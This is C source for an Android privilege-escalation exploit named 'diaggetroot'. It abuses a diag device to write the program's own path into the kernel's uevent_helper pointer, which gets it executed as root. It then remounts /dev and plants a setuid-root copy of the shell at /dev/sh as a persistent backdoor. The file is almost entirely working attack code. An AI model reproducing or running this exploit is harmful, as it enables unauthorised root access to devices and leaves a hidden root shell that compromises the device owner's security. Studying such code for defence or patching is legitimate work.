/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "libdiagexploit/diag.h"
#include "common.h"

#define DEV "/dev"
#define SYSTEM_BIN "/system/bin"
#define SHELL "sh"
#define SYSTEM_BIN_SHELL SYSTEM_BIN "/" SHELL
#define DEV_SHELL DEV "/" SHELL
#define UEVENT_HELPER_PATH "/sys/kernel/uevent_helper"

static bool
inject_uevent_helper(unsigned int uevent_helper_address,
                     const char *helper_command_path)
{
  struct diag_values data[400];
  int data_length;

  data_length = prepare_injection_data(data, sizeof(data),
                                       uevent_helper_address,
                                       helper_command_path);

  return diag_inject(data, data_length);
}

static void
usage()
{
  printf("Usage:\n");
  printf("\tdiaggetroot [uevent_helper address]\n");
}

static bool
copy_file_contents(int src_fd, int dest_fd)
{
  char buffer[BUFSIZ];
  ssize_t read_bytes;

  while ((read_bytes = read(src_fd, buffer, sizeof(buffer))) > 0) {
    if (write(dest_fd, buffer, read_bytes) != read_bytes) {
      printf("Failed to write " DEV_SHELL " due to %s\n", strerror(errno));
      return false;
    }
  }
  if (read_bytes < 0) {
    printf("Failed to read " SYSTEM_BIN_SHELL " due to %s\n", strerror(errno));
    return false;
  }
  return true;
}

static bool
copy_bin_sh(void)
{
  int src_fd, dest_fd;
  bool success = true;

  src_fd = open(SYSTEM_BIN_SHELL, O_RDONLY);
  if (src_fd < 0) {
    printf("Failed to open " SYSTEM_BIN_SHELL " due to %s\n", strerror(errno));
    return false;
  }
  dest_fd = open(DEV_SHELL, O_WRONLY | O_CREAT);
  if (dest_fd < 0) {
    printf("Failed to open " DEV_SHELL " due to %s\n", strerror(errno));
    close(src_fd);
    return false;
  }

  if (!copy_file_contents(src_fd, dest_fd)) {
    success = false;
  }

  if (success && !fchmod(dest_fd, 06755)) {
    printf("Failed modify the permissions of /dev/sh due to %s\n", strerror(errno));
    success = false;
  }

  close(dest_fd);
  close(src_fd);

  return success;
}

static bool
is_dev_shell_exists(void)
{
  struct stat stat_info;

  stat(DEV_SHELL, &stat_info);
  return S_ISREG(stat_info.st_mode);
}

static bool
make_devsh(void)
{
  if (is_dev_shell_exists()) {
    return true;
  }

  if (mount(DEV, DEV, NULL, MS_REMOUNT, NULL) < 0) {
    printf("Failed to remount " DEV " due to %s\n", strerror(errno));
    return false;
  }

  if (!copy_bin_sh()) {
    return false;
  }

  return true;
}

static char *
get_program_path(const char *program_name)
{
  char path[PATH_MAX + 1];
  char *program_path = NULL;

  if (program_name[0] == '/') {
    return strdup(program_name);
  }

  if (getcwd(path, PATH_MAX)) {
    program_path = malloc(strlen(path) + strlen(program_name) + 1);
    strcat(program_path, path);
    strcat(program_path, "/");
    strcat(program_path, program_name);
  }
  return program_path;
}

static bool
purge_uevent_helper(void)
{
  int fd;

  fd = open(UEVENT_HELPER_PATH, O_WRONLY | O_TRUNC);
  if (fd < 0) {
    printf("Failed to open " UEVENT_HELPER_PATH " due to %s\n", strerror(errno));
    return false;
  }
  write(fd, "", 1);

  close(fd);

  return true;
}

int
main(int argc, char **argv)
{
  unsigned int uevent_helper_address = 0;
  char *program_path;
  bool success;

  if (getuid() == 0) {
    if (!make_devsh()) {
      exit(EXIT_FAILURE);
    }
    purge_uevent_helper();
    exit(EXIT_SUCCESS);
  }

  if (argc >= 2) {
    uevent_helper_address = strtoul(argv[1], NULL, 16);
  }

  if (!uevent_helper_address) {
    uevent_helper_address = get_uevent_helper_address();
    if (!uevent_helper_address) {
      usage();
      exit(EXIT_FAILURE);
    }
  }

  program_path = get_program_path(argv[0]);
  success = inject_uevent_helper(uevent_helper_address,
                                 program_path);
  free(program_path);
  if (!success) {
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
